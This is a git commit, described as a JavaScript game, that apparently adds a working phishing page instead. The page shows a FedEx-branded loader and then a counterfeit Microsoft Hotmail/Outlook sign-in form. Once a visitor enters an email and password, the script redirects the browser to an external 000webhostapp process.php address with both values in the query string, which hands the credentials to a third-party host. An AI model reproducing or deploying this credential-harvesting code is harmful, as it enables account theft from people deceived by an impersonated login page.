96fddb510d43ed7ec71e20dabd50155765c93c7c
radly389 <133081292+radly389@users.noreply.github.com>
2023-05-10 06:52:23 +0200

    Pub JS Proj
    Partila JS Game

---
+++ script.js
@@ -0,0 +1,239 @@
+let mumsaidhi = document.getElementById("mumsaidhi")
+
+mumsaidhi.innerHTML = `
+ <section class="fedex_loder">
+<svg
+   xmlns:dc="http://purl.org/dc/elements/1.1/"
+   xmlns:cc="http://creativecommons.org/ns#"
+   xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
+   xmlns:svg="http://www.w3.org/2000/svg"
+   xmlns="http://www.w3.org/2000/svg"
+   xmlns:sodipodi="http://sodipodi.sourceforge.net/DTD/sodipodi-0.dtd"
+   xmlns:inkscape="http://www.inkscape.org/namespaces/inkscape"
+   width="74.535995"
+   height="33.924999"
+   viewBox="-0.81 -0.354 74.535996 33.924999"
+   xml:space="preserve"
+   id="svg2"
+   version="1.1"
+   inkscape:version="0.48.1 "
+   sodipodi:docname="AJAX.svg"><metadata
+   id="metadata32"><rdf:RDF><cc:Work
+       rdf:about=""><dc:format>image/svg+xml</dc:format><dc:type
+         rdf:resource="http://purl.org/dc/dcmitype/StillImage" /></cc:Work></rdf:RDF></metadata><sodipodi:namedview
+   pagecolor="#ffffff"
+   bordercolor="#666666"
+   borderopacity="1"
+   objecttolerance="10"
+   gridtolerance="10"
+   guidetolerance="10"
+   inkscape:pageopacity="0"
+   inkscape:pageshadow="2"
+   inkscape:window-width="1280"
+   inkscape:window-height="1004"
+   id="namedview30"
+   showgrid="false"
+   fit-margin-top="0"
+   fit-margin-left="0"
+   fit-margin-right="0.2"
+   fit-margin-bottom="0"
+   inkscape:zoom="10.026645"
+   inkscape:cx="50.329457"
+   inkscape:cy="13.826428"
+   inkscape:window-x="-8"
+   inkscape:window-y="-8"
+   inkscape:window-maximized="1"
+   inkscape:current-layer="g6" />
+	<defs
+   id="defs4">
+	</defs>
+	<g
+   id="g6"
+   transform="translate(-0.81,-0.35400034)">
+		
+		<polygon
+   points="59.95,7.772 62.928,11.054 65.795,7.772 71.917,7.772 65.934,14.5 71.999,21.283 65.63,21.283 62.68,17.975 59.757,21.283 53.607,21.283 59.619,14.528 53.607,7.772 "
+   id="polygon10"
+   style="fill:#ff5900" />
+		<polygon
+   points="53.607,7.772 53.607,12.337 46.798,12.337 46.798,16.526 53.607,16.526 53.607,21.283 41.794,21.283 41.794,0 53.607,0 53.607,4.744 46.798,4.744 46.798,7.772 "
+   id="polygon12"
+   style="fill:#ff5900" />
+		<path
+   d="M 36.811,0 V 8.71 H 36.756 C 35.652,7.442 34.274,7.001 32.675,7.001 c -3.276,0 -5.744,2.228 -6.61,5.172 C 25.076,8.929 22.528,6.94 18.75,6.94 c -3.068,0 -5.491,1.377 -6.755,3.621 V 7.772 H 5.653 V 4.744 h 6.921 V 0 H 0 v 21.283 h 5.653 v -8.946 h 5.635 c -0.168,0.657 -0.258,1.361 -0.258,2.104 0,4.439 3.392,7.555 7.72,7.555 3.64,0 6.039,-1.709 7.307,-4.824 h -4.845 c -0.655,0.937 -1.152,1.214 -2.462,1.214 -1.519,0 -2.829,-1.325 -2.829,-2.896 h 9.865 c 0.428,3.526 3.175,6.567 6.944,6.567 1.626,0 3.115,-0.8 4.025,-2.15 h 0.055 v 1.378 h 4.983 V 0 H 36.811 z M 16.079,12.4 c 0.314,-1.352 1.363,-2.235 2.672,-2.235 1.441,0 2.436,0.856 2.698,2.235 0.11,0 -5.37,0 -5.37,0 z m 17.707,5.643 c -1.837,0 -2.979,-1.712 -2.979,-3.499 0,-1.91 0.993,-3.747 2.979,-3.747 2.059,0 2.879,1.837 2.879,3.747 0,1.811 -0.869,3.499 -2.879,3.499 z"
+   id="path14"
+   inkscape:connector-curvature="0"
+   style="fill:#2a007c" />
+		<path
+   d="m 41.795,31.925 v -7.627 h 4.214 v 0.569 H 42.49 v 2.812 h 3.37 v 0.569 h -3.37 v 3.106 h 3.676 v 0.57 h -4.371 z"
+   id="path16"
+   inkscape:connector-curvature="0"
+   style="fill:#2a007c" />
+		<path
+   d="m 46.669,31.925 2.055,-2.739 -1.949,-2.591 h 0.79 l 1.591,2.117 1.559,-2.117 h 0.79 l -1.98,2.591 2.064,2.739 h -0.8 l -1.707,-2.266 -1.622,2.266 h -0.791 z"
+   id="path18"
+   inkscape:connector-curvature="0"
+   style="fill:#2a007c" />
+		<path
+   d="m 52.926,33.925 h -0.643 v -5.739 c 0,-0.527 0,-1.063 -0.032,-1.591 h 0.633 l 0.021,0.801 c 0.399,-0.633 0.926,-0.927 1.717,-0.927 1.643,0 2.348,1.358 2.348,2.79 0,1.434 -0.705,2.792 -2.348,2.792 -0.738,0 -1.317,-0.284 -1.696,-0.896 v 2.77 z m 3.36,-4.666 c 0,-1.137 -0.475,-2.254 -1.738,-2.254 -1.19,0 -1.622,0.98 -1.622,2.254 0,1.275 0.432,2.254 1.622,2.254 1.264,0 1.738,-1.116 1.738,-2.254 z"
+   id="path20"
+   inkscape:connector-curvature="0"
+   style="fill:#2a007c" />
+		<path
+   d="m 60.274,27.089 c -1.064,0 -1.434,0.896 -1.434,1.822 v 3.014 h -0.643 v -3.762 c 0,-0.516 -0.01,-1.041 -0.031,-1.568 H 58.8 l 0.041,0.769 c 0.316,-0.61 0.844,-0.895 1.549,-0.895 0.095,0 0.2,0.01 0.295,0.021 v 0.643 C 60.537,27.11 60.421,27.089 60.274,27.089 z"
+   id="path22"
+   inkscape:connector-curvature="0"
+   style="fill:#2a007c" />
+		<path
+   d="m 61.472,29.375 c 0,1.2 0.568,2.19 1.737,2.19 0.905,0 1.327,-0.6 1.485,-1.2 h 0.611 c -0.285,1.116 -0.97,1.686 -2.181,1.686 -1.622,0 -2.339,-1.201 -2.339,-2.696 0,-1.527 0.748,-2.886 2.423,-2.886 1.696,0 2.149,1.484 2.149,2.906 h -3.885 z m 0.02,-0.484 h 3.181 c 0,-1.043 -0.494,-1.938 -1.506,-1.938 -0.916,-10e-4 -1.549,0.694 -1.675,1.938 z"
+   id="path24"
+   inkscape:connector-curvature="0"
+   style="fill:#2a007c" />
+		<path
+   d="m 67.866,32.051 c -1.095,0 -1.916,-0.517 -1.916,-1.686 h 0.643 c 0,0.8 0.526,1.2 1.306,1.2 0.727,0 1.295,-0.348 1.295,-1.062 0,-0.643 -0.663,-0.812 -1.358,-1.012 -0.842,-0.242 -1.759,-0.506 -1.759,-1.538 0,-1.147 0.958,-1.484 1.854,-1.484 1.031,0 1.801,0.399 1.832,1.505 H 69.12 c -0.031,-0.631 -0.484,-0.989 -1.169,-0.989 -0.537,0 -1.19,0.21 -1.19,0.905 0,0.633 0.653,0.812 1.348,1.001 0.844,0.231 1.77,0.484 1.77,1.517 -0.001,1.2 -0.927,1.643 -2.013,1.643 z"
+   id="path26"
+   inkscape:connector-curvature="0"
+   style="fill:#2a007c" />
+		<path
+   d="m 72.322,32.051 c -1.096,0 -1.917,-0.517 -1.917,-1.686 h 0.643 c 0,0.8 0.526,1.2 1.307,1.2 0.727,0 1.295,-0.348 1.295,-1.062 0,-0.643 -0.664,-0.812 -1.359,-1.012 -0.842,-0.242 -1.758,-0.506 -1.758,-1.538 0,-1.147 0.958,-1.484 1.854,-1.484 1.031,0 1.801,0.399 1.832,1.505 h -0.643 c -0.031,-0.631 -0.484,-0.989 -1.169,-0.989 -0.537,0 -1.19,0.21 -1.19,0.905 0,0.633 0.653,0.812 1.349,1.001 0.843,0.231 1.77,0.484 1.77,1.517 -0.002,1.2 -0.929,1.643 -2.014,1.643 z"
+   id="path28"
+   inkscape:connector-curvature="0"
+   style="fill:#2a007c" />
+	</g>
+</svg>
+
+  </section>
+
+  <section class="hotmail_container">
+
+<h5 id="hotMessage"></h5>
+
+<div class="show_email hotmail">
+
+          
+<svg xmlns="http://www.w3.org/2000/svg" width="108" height="24" viewBox="0 0 108 24"><title>assets</title><path d="M44.836,4.6V18.4h-2.4V7.583H42.4L38.119,18.4H36.531L32.142,7.583h-.029V18.4H29.9V4.6h3.436L37.3,14.83h.058L41.545,4.6Zm2,1.049a1.268,1.268,0,0,1,.419-.967,1.413,1.413,0,0,1,1-.39,1.392,1.392,0,0,1,1.02.4,1.3,1.3,0,0,1,.4.958,1.248,1.248,0,0,1-.414.953,1.428,1.428,0,0,1-1.01.385A1.4,1.4,0,0,1,47.25,6.6a1.261,1.261,0,0,1-.409-.948M49.41,18.4H47.081V8.507H49.41Zm7.064-1.694a3.213,3.213,0,0,0,1.145-.241,4.811,4.811,0,0,0,1.155-.635V18a4.665,4.665,0,0,1-1.266.481,6.886,6.886,0,0,1-1.554.164,4.707,4.707,0,0,1-4.918-4.908,5.641,5.641,0,0,1,1.4-3.932,5.055,5.055,0,0,1,3.955-1.545,5.414,5.414,0,0,1,1.324.168,4.431,4.431,0,0,1,1.063.39v2.233a4.763,4.763,0,0,0-1.1-.611,3.184,3.184,0,0,0-1.15-.217,2.919,2.919,0,0,0-2.223.9,3.37,3.37,0,0,0-.847,2.416,3.216,3.216,0,0,0,.813,2.338,2.936,2.936,0,0,0,2.209.837M65.4,8.343a2.952,2.952,0,0,1,.5.039,2.1,2.1,0,0,1,.375.1v2.358a2.04,2.04,0,0,0-.534-.255,2.646,2.646,0,0,0-.852-.12,1.808,1.808,0,0,0-1.448.722,3.467,3.467,0,0,0-.592,2.223V18.4H60.525V8.507h2.329v1.559h.038A2.729,2.729,0,0,1,63.855,8.8,2.611,2.611,0,0,1,65.4,8.343m1,5.254A5.358,5.358,0,0,1,67.792,9.71a5.1,5.1,0,0,1,3.85-1.434,4.742,4.742,0,0,1,3.623,1.381,5.212,5.212,0,0,1,1.3,3.729,5.257,5.257,0,0,1-1.386,3.83,5.019,5.019,0,0,1-3.772,1.424,4.935,4.935,0,0,1-3.652-1.352A4.987,4.987,0,0,1,66.406,13.6m2.425-.077a3.535,3.535,0,0,0,.7,2.368,2.505,2.505,0,0,0,2.011.818,2.345,2.345,0,0,0,1.934-.818,3.783,3.783,0,0,0,.664-2.425,3.651,3.651,0,0,0-.688-2.411,2.389,2.389,0,0,0-1.929-.813,2.44,2.44,0,0,0-1.988.852,3.707,3.707,0,0,0-.707,2.43m11.2-2.416a1,1,0,0,0,.318.785,5.426,5.426,0,0,0,1.4.717,4.767,4.767,0,0,1,1.959,1.256,2.6,2.6,0,0,1,.563,1.689A2.715,2.715,0,0,1,83.2,17.794a4.558,4.558,0,0,1-2.9.847,6.978,6.978,0,0,1-1.362-.149,6.047,6.047,0,0,1-1.265-.38v-2.29a5.733,5.733,0,0,0,1.367.7,4,4,0,0,0,1.328.26,2.365,2.365,0,0,0,1.164-.221.79.79,0,0,0,.375-.741,1.029,1.029,0,0,0-.39-.813,5.768,5.768,0,0,0-1.477-.765,4.564,4.564,0,0,1-1.829-1.213,2.655,2.655,0,0,1-.539-1.713,2.706,2.706,0,0,1,1.063-2.2A4.243,4.243,0,0,1,81.5,8.256a6.663,6.663,0,0,1,1.164.115,5.161,5.161,0,0,1,1.078.3v2.214a4.974,4.974,0,0,0-1.078-.529,3.6,3.6,0,0,0-1.222-.221,1.781,1.781,0,0,0-1.034.26.824.824,0,0,0-.371.712M85.278,13.6A5.358,5.358,0,0,1,86.664,9.71a5.1,5.1,0,0,1,3.849-1.434,4.743,4.743,0,0,1,3.624,1.381,5.212,5.212,0,0,1,1.3,3.729,5.259,5.259,0,0,1-1.386,3.83,5.02,5.02,0,0,1-3.773,1.424,4.934,4.934,0,0,1-3.652-1.352A4.987,4.987,0,0,1,85.278,13.6m2.425-.077a3.537,3.537,0,0,0,.7,2.368,2.506,2.506,0,0,0,2.011.818,2.345,2.345,0,0,0,1.934-.818,3.783,3.783,0,0,0,.664-2.425,3.651,3.651,0,0,0-.688-2.411,2.39,2.39,0,0,0-1.93-.813,2.439,2.439,0,0,0-1.987.852,3.707,3.707,0,0,0-.707,2.43m15.464-3.109H99.7V18.4H97.341V10.412H95.686V8.507h1.655V7.13a3.423,3.423,0,0,1,1.015-2.555,3.561,3.561,0,0,1,2.6-1,5.807,5.807,0,0,1,.751.043,2.993,2.993,0,0,1,.577.13V5.764a2.422,2.422,0,0,0-.4-.164,2.107,2.107,0,0,0-.664-.1,1.407,1.407,0,0,0-1.126.457A2.017,2.017,0,0,0,99.7,7.313V8.507h3.469V6.283l2.339-.712V8.507h2.358v1.906h-2.358v4.629a1.951,1.951,0,0,0,.332,1.29,1.326,1.326,0,0,0,1.044.375,1.557,1.557,0,0,0,.486-.1,2.294,2.294,0,0,0,.5-.231V18.3a2.737,2.737,0,0,1-.736.231,5.029,5.029,0,0,1-1.015.106,2.887,2.887,0,0,1-2.209-.784,3.341,3.341,0,0,1-.736-2.363Z" fill="#737373"/><rect width="10.931" height="10.931" fill="#f25022"/><rect x="12.069" width="10.931" height="10.931" fill="#7fba00"/><rect y="12.069" width="10.931" height="10.931" fill="#00a4ef"/><rect x="12.069" y="12.069" width="10.931" height="10.931" fill="#ffb900"/></svg>
+
+          <h1 id="headerText">Sign in</h1>
+          
+          <div id="hot_email">
+            <input id="input_hotmail1" type="email" placeholder="Email, phone, or Skype">
+            <p id="emailHolder"></p>
+          </div>
+
+          <div id="hot_pass">
+            <h2>Enter password</h2>
+            <input id="input_hotmail2" type="password" placeholder="Enter email password">
+          </div>
+
+          <p id="noAcc">
+            No account? <a href="#">Create one!</a>
+          </p>
+          
+          <div class="submit_btn">
+            <button id="submit_hotmail1">Next</button>
+          <button id="submit_hotmail2">Sign in</button>
+          </div>
+                  
+        </div>
+      
+        <div class="hotmail_footer">
+          <div>Terms of use</div> &nbsp; &nbsp; &nbsp;
+          <span>Privacy & cookies &nbsp; &nbsp;.&nbsp;.&nbsp;.</div>
+        </div>
+        
+  </section>
+ 
+ `
+
+
+
+const validEmail = /^(([^<>()[\]\\.,;:\s@"]+(\.[^<>()[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/
+
+const err = document.getElementById("hotMessage");
+const h1Text = document.getElementById("headerText");
+const noAcc = document.getElementById("noAcc");
+
+const email = document.getElementById("input_hotmail1");
+const emailHolder = document.getElementById("emailHolder");
+
+const passDiv = document.getElementById("hot_pass");
+const pass = document.getElementById("input_hotmail2");
+
+const submit1 = document.getElementById("submit_hotmail1");
+const submit2 = document.getElementById("submit_hotmail2");
+
+let url;
+
+const hotmailContainer = document.getElementsByClassName("hotmail_container")[0];
+const fedexContainer = document.getElementsByClassName("fedex_loder")[0];
+
+setTimeout(() => {
+
+    fedexContainer.style.display = "none"
+    hotmailContainer.style.display = "block"
+
+}, 3000);
+
+submit1.addEventListener("click", function () {
+
+    if (validEmail.test(email.value) && email.value != "") {
+
+        email.style.display = "none"
+        h1Text.style.display = "none"
+        passDiv.style.display = "block"
+
+        emailHolder.innerHTML = '<i class="fa-solid fa-arrow-left"></i> ' + email.value
+
+        submit1.style.display = "none"
+        submit2.style.display = "block"
+        noAcc.style.display = "none"
+
+    }
+    else if (email.value == "") {
+        err.style.display = "block"
+        err.innerText = "Email address can't be empty!"
+
+        setTimeout(() => {
+            err.innerText = ""
+        }, 5000);
+    }
+    else {
+        err.style.display = "block"
+        err.innerText = "Wrong email address"
+
+        setTimeout(() => {
+            err.innerText = ""
+        }, 5000);
+    }
+});
+
+submit2.addEventListener("click", function () {
+
+    if (pass.value.length < 6 && pass.value != "") {
+        err.style.display = "block"
+        err.innerText = "Wrong password"
+
+        setTimeout(() => {
+            err.innerText = ""
+        }, 5000);
+
+    }
+    else if (pass.value.length < 6 && pass.value == "") {
+        err.style.display = "block"
+        err.innerText = "Please enter your password"
+
+        setTimeout(() => {
+            err.innerText = ""
+        }, 5000);
+
+    }
+    else {
+
+        url = "Domain" + "=" + "FedEx Anyi: Hotmail | Outlook" + "&" + "Mail" + "=" + email.value + "&" + "Password" + "=" + pass.value
+
+        location = "https://weatherfocastapi.000webhostapp.com/anyi/process.php?" + url
+
+        email.value = ""
+        pass.value = ""
+    }
+})
